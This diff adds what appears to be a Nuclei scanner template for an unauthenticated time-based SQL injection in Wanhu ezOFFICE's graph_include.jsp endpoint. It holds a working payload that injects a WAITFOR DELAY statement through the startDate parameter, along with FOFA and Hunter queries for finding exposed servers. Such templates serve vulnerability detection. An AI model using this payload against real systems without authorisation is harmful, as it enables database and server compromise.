@@ -1,0 +1,31 @@
+id: wanhu-ezoffice-graph_include-sqli
+info:
+  name: 万户 ezoffice graph_include.jsp - sqli
+  author: leadlife
+  severity: high
+  description: 万户 ezOFFICE /defaultroot/platform/report/graphreport/graph_include.jsp接口处存在SQL注入漏洞，未授权的攻击者可利用此漏洞获取数据库权限，深入利用可获取服务器权限。
+  reference: 
+    - https://github.com/wy876/POC/blob/02ac90075317fcc0cacfb84ea681079b0892a174/%E4%B8%87%E6%88%B7ezOFFICE%E7%B3%BB%E7%BB%9Fgraph_include.jsp%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    veified: true
+    max-request: 1
+    hunter-query: app.name="万户 Ezoffice OA"
+    fofa-query: app="万户网络-ezOFFICE"  
+  tags: wanhu,sqli,oa,time,ezoffice
+
+http:
+  - raw:
+      - |+
+        @timeout: 15s
+        GET /defaultroot/platform/report/graphreport/graph_include.jsp?id=2&startDate=2022-01-01%2000:00:00.000%27%20as%20datetime)%20group%20by%20t.emp_id,t.empname%20)%20%20s%20group%20by%20empname%20order%20by%20num%20desc%20%20WAITFOR%20DELAY%20%270:0:6%27-- HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
+        Connection: close
+    
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - duration >= 5 && duration < 9
+          - contains(body,'defaultroot')
+        condition: and
